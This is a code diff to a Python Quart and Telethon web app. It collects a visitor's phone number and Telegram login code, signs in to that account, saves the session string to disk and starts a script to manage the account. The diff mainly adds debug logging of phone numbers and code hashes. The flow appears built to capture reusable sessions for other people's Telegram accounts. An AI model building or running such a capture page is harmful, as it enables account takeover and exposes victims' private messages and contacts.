@@ -1,12 +1,3 @@
-
-
-
-
-
-
-
-
-#-----------------------------------------------------------------------------------------WITH COMMANDS
 from quart import Quart, request, redirect, url_for, render_template, session as quart_session
 import os
 from telethon import TelegramClient
@@ -18,6 +9,7 @@ import subprocess
 load_dotenv()
 
 logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
 
 api_id = os.getenv('API_ID')
 api_hash = os.getenv('API_HASH')
@@ -31,7 +23,12 @@ async def create_telegram_client(session_str=None):
     session = StringSession(session_str) if session_str else StringSession()
     global client
     client = TelegramClient(session, api_id, api_hash)
-    await client.connect()
+    try:
+        await client.connect()
+        logger.debug("Телеграм клиент успешно подключен.")
+    except Exception as e:
+        logger.error(f"Ошибка при подключении Телеграм клиента: {e}")
+        raise
 
 @app.route('/')
 async def index():
@@ -47,12 +44,16 @@ async def telegram_number_route():
         phone_number = (await request.form)['phone_number']
         quart_session['phone_number'] = phone_number
 
+        logger.debug(f"Запрос на отправку кода для номера: {phone_number}")
+
         try:
             await create_telegram_client()
             result = await client.send_code_request(phone_number)
             quart_session['phone_code_hash'] = result.phone_code_hash
+            logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
         except Exception as e:
-            print(f"Ошибка при отправке кода: {e}")
+            logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
+            return f"Ошибка при отправке кода: {e}"
 
         return redirect(url_for('verify_code'))
     return await render_template('telegram-number.html')
@@ -64,6 +65,8 @@ async def verify_code():
         phone_number = quart_session.get('phone_number')
         phone_code_hash = quart_session.get('phone_code_hash')
 
+        logger.debug(f"Проверка кода для номера {phone_number} с hash: {phone_code_hash}")
+
         if phone_number and phone_code_hash:
             try:
                 await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
@@ -73,11 +76,14 @@ async def verify_code():
                 with open(session_file_path, "w") as session_file:
                     session_file.write(session_str)
                 
+                logger.debug(f"Успешная авторизация для номера {phone_number}. Сессия сохранена в {session_file_path}")
+
                 # Автоматически запускаем консольное приложение для управления аккаунтом
                 subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)
 
                 return redirect(url_for('success_page'))
             except Exception as e:
+                logger.error(f"Ошибка при проверке кода для номера {phone_number}: {e}")
                 return f"Ошибка при проверке кода: {e}"
         return redirect(url_for('telegram_number_route'))
     return await render_template('telegram-code.html')
@@ -89,10 +95,6 @@ async def success_page():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
-
-
-
-
 
 
 
